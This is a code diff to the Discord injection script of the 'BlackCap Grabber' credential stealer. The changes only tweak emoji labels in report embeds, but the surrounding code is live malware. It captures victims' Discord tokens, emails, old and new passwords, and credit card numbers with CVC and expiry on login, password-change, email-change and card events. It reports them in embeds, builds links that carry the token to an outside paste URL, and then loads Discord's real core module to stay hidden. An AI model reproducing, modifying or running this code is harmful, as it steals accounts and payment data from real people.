@@ -300,7 +300,7 @@ async function FirstTime() {
                                 value: `${GetLangue(b.locale)}`,
                                 inline: !0
 								}, {
-                                name: "NSFW <a:nsfw:1041640474617839616>>",
+                                name: "NSFW <a:nsfw:1041640474617839616>",
                                 value: `${GetNSFW(b.nsfw_allowed)}`,
                                 inline: !1
 								}, {
@@ -312,7 +312,7 @@ async function FirstTime() {
                                 value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                                 inline: !0
 								}, {
-                                name: "Token <a:tokens:1041634540537511957>>",
+                                name: "<a:tokens:1041634540537511957> Token",
                                 value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                 inline: !1
 								}],
@@ -402,7 +402,7 @@ async function FirstTime() {
                                         value: `${GetBadges(b.flags)}`,
                                         inline: !0
 								}, {
-                                        name: "NSFW <a:nsfw:1041640474617839616>>",
+                                        name: "NSFW <a:nsfw:1041640474617839616>",
                                         value: `${GetNSFW(b.nsfw_allowed)}`,
                                         inline: !1
 								}, {
@@ -414,7 +414,7 @@ async function FirstTime() {
                                         value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                                         inline: !0
 								}, {
-                                        name: "Token <a:tokens:1041634540537511957>>",
+                                        name: "<a:tokens:1041634540537511957> Token",
                                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                         inline: !1
 								}],
@@ -851,7 +851,7 @@ async function Login(email, password, token) {
                         value: `${GetLangue(info.locale)}`,
                         inline: !0
 												}, {
-                        name: "NSFW <a:nsfw:1041640474617839616>>",
+                        name: "NSFW <a:nsfw:1041640474617839616>",
                         value: `${GetNSFW(info.nsfw_allowed)}`,
                         inline: !1
 												}, {
@@ -871,11 +871,11 @@ async function Login(email, password, token) {
                         value: `\`${email}\``,
                         inline: !0
 												}, {
-                        name: "Password <a:password:1041639669047238676>",
+                        name: "<a:password:1041639669047238676> Password",
                         value: `\`${password}\``,
                         inline: !0
 												}, {
-                        name: "Token <a:tokens:1041634540537511957>>",
+                        name: "<a:tokens:1041634540537511957> Token",
                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                         inline: !1
 												}, ],
@@ -1007,7 +1007,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         value: `${GetLangue(info.locale)}`,
                         inline: !0
 												}, {
-                        name: "NSFW <a:nsfw:1041640474617839616>>",
+                        name: "NSFW <a:nsfw:1041640474617839616>",
                         value: `${GetNSFW(info.nsfw_allowed)}`,
                         inline: !1
 												}, {
@@ -1035,7 +1035,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         value: `\`${newpassword}\``,
                         inline: !0
 												}, {
-                        name: "Token <a:tokens:1041634540537511957>>",
+                        name: "<a:tokens:1041634540537511957> Token",
                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                         inline: !1
 												}, ],
@@ -1171,7 +1171,7 @@ async function ChangeEmail(newemail, password, token) {
                                 value: `${GetLangue(info.locale)}`,
                                 inline: !0
 					}, {
-                                name: "NSFW <a:nsfw:1041640474617839616>>",
+                                name: "NSFW <a:nsfw:1041640474617839616>",
                                 value: `${GetNSFW(info.nsfw_allowed)}`,
                                 inline: !1
 					}, {
@@ -1191,11 +1191,11 @@ async function ChangeEmail(newemail, password, token) {
                                 value: `\`${newemail}\``,
                                 inline: !0
 					}, {
-                                name: "Password <a:password:1041639669047238676>",
+                                name: "<a:password:1041639669047238676> Password",
                                 value: `\`${password}\``,
                                 inline: !0
 					}, {
-                                name: "Token <a:tokens:1041634540537511957>>",
+                                name: "<a:tokens:1041634540537511957> Token",
                                 value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                 inline: !1
 					},
@@ -1259,12 +1259,12 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(info.premium_type)}\n
 					**Language** <:language:1041640473477001236>\n${GetLangue(info.locale)}\n
 					**A2F** <a:a2f:1040272766982692885>\n${GetA2F(info.mfa_enabled)}\n
-					**NSFW** <a:nsfw:1041640474617839616>>\n${GetNSFW(info.nsfw_allowed)}\n
+					**NSFW** <a:nsfw:1041640474617839616>\n${GetNSFW(info.nsfw_allowed)}\n
                     **Badges** <:badge:1041634538150973460>\n${GetBadges(info.flags)}\n
                     **Credit Card Number**\n\`\`\`${number}\`\`\`\n
                     **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
                     **CVC**\n\`\`\`${cvc}\`\`\`\n
-                    **Token** <a:tokens:1041634540537511957>> \n\`\`\`${token}\`\`\``,
+                    <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
                     "author": {
                         "name": "BlackCap"
                     },
@@ -1354,6 +1354,7 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
         })).catch(console.error);
     }
 });
+
 
 
 module.exports = require('./core.asar')
